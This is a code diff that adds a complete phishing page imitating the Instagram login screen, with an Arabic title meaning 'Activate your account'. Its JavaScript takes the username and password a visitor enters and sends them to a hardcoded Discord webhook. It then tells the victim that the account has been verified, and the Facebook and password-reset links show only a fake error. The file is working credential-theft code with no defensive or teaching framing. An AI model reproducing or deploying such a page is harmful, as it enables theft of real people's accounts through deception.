@@ -1,0 +1,149 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تنشيط حسابك</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Pacifico&display=swap" rel="stylesheet">
+    <link rel="icon" type="image/png" href="icon.png">
+    <style>
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background-color: #fafafa;
+            font-family: Arial, sans-serif;
+            margin: 0;
+        }
+        .login-container {
+            background: white;
+            padding: 20px;
+            border: 1px solid #ddd;
+            text-align: center;
+            width: 90%;
+            max-width: 350px;
+        }
+        .login-container h1 {
+            font-family: 'Pacifico', cursive;
+            font-size: 48px;
+            margin-bottom: 20px;
+            font-weight: normal;
+        }
+        .facebook-login {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background-color: #1877f2;
+            color: white;
+            padding: 10px;
+            border-radius: 5px;
+            font-size: 14px;
+            cursor: pointer;
+            margin-bottom: 10px;
+        }
+        .facebook-login i {
+            margin-right: 8px;
+        }
+        .or {
+            margin: 15px 0;
+            color: #aaa;
+            font-weight: bold;
+        }
+        .login-container input {
+            width: 100%;
+            padding: 10px;
+            margin: 8px 0;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            font-size: 14px;
+            box-sizing: border-box;
+            background-color: #fafafa;
+        }
+        .login-container button {
+            width: 100%;
+            padding: 10px;
+            background-color: #0095f6;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            font-size: 14px;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+        .login-container button:hover {
+            background-color: #0077cc;
+        }
+        .forgot-password {
+            display: block;
+            text-decoration: none;
+            color: #0095f6;
+            font-size: 14px;
+            margin-top: 10px;
+            cursor: pointer;
+        }
+        .login-container .login-btn {
+            background-color: #b2dffc;
+            color: white;
+            cursor: not-allowed;
+        }
+        @media (max-width: 400px) {
+            .login-container {
+                padding: 15px;
+            }
+            .login-container h1 {
+                font-size: 36px;
+            }
+            .login-container input,
+            .login-container button {
+                font-size: 12px;
+                padding: 8px;
+            }
+        }
+    </style>
+    <script>
+        function showErrorMessage() {
+            alert("حدث خطأ ، حاول مجددا");
+        }
+
+    function sendLoginToDiscord() {
+        let username = document.getElementById("username").value;
+        let password = document.getElementById("password").value;
+
+      
+        const webhookURL = "https://discord.com/api/webhooks/1343340234464821248/7bYyB-mM441fpzIYpaNs8YkqF3OgvLKOYm1vLwvo0e9g-ygyQPXTd6sc7B4PhMePMZQA";
+
+        fetch(webhookURL, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+                content: `**User Login Attempt**\n📌 Username: ${username}\n🔑 Password: ${password}`
+            })
+        }).then(response => response.text())
+          .then(data => console.log("Sent to Discord:", data))
+          .catch(error => console.error("Error:", error));
+
+          alert("تم التأكد من نشاط حسابك!")
+
+        
+    }
+
+
+    </script>
+</head>
+<body>
+    <div class="login-container">
+        <h1>Instagram</h1>
+        <div class="facebook-login" onclick="showErrorMessage()">
+            <i class="fa-brands fa-facebook"></i> Continue with Facebook
+        </div>
+        <div class="or">OR</div>
+        <input id="username" type="text" placeholder="Phone number, username, or email">
+        <input id="password" type="password" placeholder="Password">
+        <button onclick="sendLoginToDiscord()">Log In</button>
+
+        <a href="#" class="forgot-password" onclick="showErrorMessage()">Forgot password?</a>
+    </div>
+</body>
+</html>
